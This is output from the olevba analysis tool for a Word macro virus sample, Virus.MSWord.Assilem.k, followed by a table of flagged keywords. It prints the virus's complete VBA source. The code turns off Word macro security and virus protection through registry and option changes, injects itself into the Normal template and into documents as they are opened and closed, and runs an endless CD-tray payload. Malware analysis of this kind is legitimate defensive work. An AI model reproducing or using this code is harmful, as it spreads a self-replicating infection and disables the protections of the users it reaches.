olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Assilem.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Assilem.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WMXP.DrDope
Attribute VB_Name = "DrDope"

Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Private Sub Document_Open()
On Error Resume Next
'VirusName: Doctor Dope
'coded by Necronomikon
'Info: Written for a friend of mine!We all call him Doctor Dope(Steve)!?;)
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
CommandBars("Macro").Controls("Security...").Enabled = False
'--- cut here ---
'this code is taken from XP.Kallisti by jackie/lz0
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") <> 1& Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
'--- cut here ---
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
NT1 = NT.CodeModule.CountOfLines
AD1 = AD.CodeModule.CountOfLines
Nec = 2
If AD.Name <> "ddope" Then
If AD1 > 0 Then _
AD.CodeModule.DeleteLines 1, AD1
Set ToInfect = AD
AD.Name = "ddope"
DoAD = True
End If
If NT.Name <> "ddope" Then
If NT1 > 0 Then _
NT.CodeModule.DeleteLines 1, NT1
Set ToInfect = NT
NT.Name = "ddope"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo bye
If DoNT = True Then
Do While AD.CodeModule.Lines(1, 1) = ""
AD.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While AD.CodeModule.Lines(Nec, 1) <> ""
ToInfect.CodeModule.InsertLines Nec, AD.CodeModule.Lines(Nec, 1)
Nec = Nec + 1
Loop
End If
End If
If DoAD = True Then
Do While NT.CodeModule.Lines(1, 1) = ""
NT.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While NT.CodeModule.Lines(Nec, 1) <> ""
ToInfect.CodeModule.InsertLines Nec, NT.CodeModule.Lines(Nec, 1)
Nec = Nec + 1
Loop
End If
bye:
If NT1 <> 0 And AD1 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
Call Payload
End Sub
Private Sub Payload()
On Error Resume Next
'Thanks WalruS for code!;)
Do
mciSendString "set cd door open", 0, 0, 0: mciSendString "set cd door closed", 0, 0, 0: mciSendString "set cd time format tmsf wait", 0, 0, 0: mciSendString "open cdaudio alias cd wait shareable", 0, 0, 0
Loop
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|open                |May open a file                              |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winmm.dll           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

